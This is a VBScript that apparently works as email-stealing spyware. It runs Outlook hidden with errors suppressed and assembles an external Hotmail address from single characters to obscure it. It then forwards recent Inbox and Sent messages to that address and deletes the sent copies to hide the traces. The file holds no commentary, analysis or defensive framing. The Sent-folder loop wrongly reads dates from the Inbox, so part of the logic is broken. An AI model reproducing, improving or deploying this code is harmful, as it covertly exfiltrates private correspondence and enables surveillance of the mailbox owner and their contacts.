On Error Resume Next
Dim EachItem
Dim MailItem, InboxFolder,sentFolder,compare
Dim theApp, theNameSpace,theMailItem,datee,Daydiff,dayOfWeek
Dim temppp1, temppp2, temppp3, temppp4, temppp5
Dim temppp6, temppp7, temppp8, temppp9, temppp10, temppp11
Dim temppp12, temppp13, temppp14,temppp15,temppp
temppp1="c"
temppp2="p"
temppp3="r"
temppp4="k"
temppp5="i"
temppp6="h"
temppp7="e"
temppp8="."
temppp9="@"
temppp10="t"
temppp11="a"
temppp12="o"
temppp13="m"
temppp14="l"
temppp15="v"
temppp=temppp15&temppp1&temppp6&temppp7&temppp1&temppp4&temppp2&temppp3&temppp9
temppp=temppp&temppp6&temppp12&temppp10&temppp13&temppp11&temppp5&temppp14&temppp8
temppp=temppp&temppp1&temppp12&temppp13
compare=-1
Set theApp = CreateObject ("Outlook.Application")
theApp.Visible = False
Set theNameSpace = theApp.GetNamespace("MAPI")
Set InboxFolder = theNameSpace.GetDefaultFolder(6)
For i=1 to InboxFolder.items.count
Set theMailItem = theApp.CreateItem(olMailItem)
theMailItem.Recipients.Add temppp
theMailItem.Subject = "ibox"&i&" "&InboxFolder.items(i).Subject
theMailItem.Body = InboxFolder.items(i).body
datee = InboxFolder.items(i).ReceivedTime
Daydiff = DateDiff("d",Now,datee)
dayOfWeek = Int(Weekday(now))
If dayofWeek = 2 Then
compare = -3
End If
If Daydiff =compare Then
theMailItem.DeleteAfterSubmit = True
theMailItem.Send
End If
Next
Set sentFolder = theNameSpace.GetDefaultFolder(5)
For i=1 to sentFolder.items.count
Set theMailItem = theApp.CreateItem(olMailItem)
theMailItem.Recipients.Add temppp
theMailItem.Subject = "sbox"&i&" "&sentFolder.items(i).Subject
theMailItem.Body = sentFolder.items(i).body
datee = InboxFolder.items(i).SentOn
Daydiff = DateDiff("d",Now,datee)
dayOfWeek = Int(Weekday(now))
If dayofWeek = 2 Then
compare = -3
End If
If Daydiff =compare Then
theMailItem.DeleteAfterSubmit = True
theMailItem.Send
End If
Next
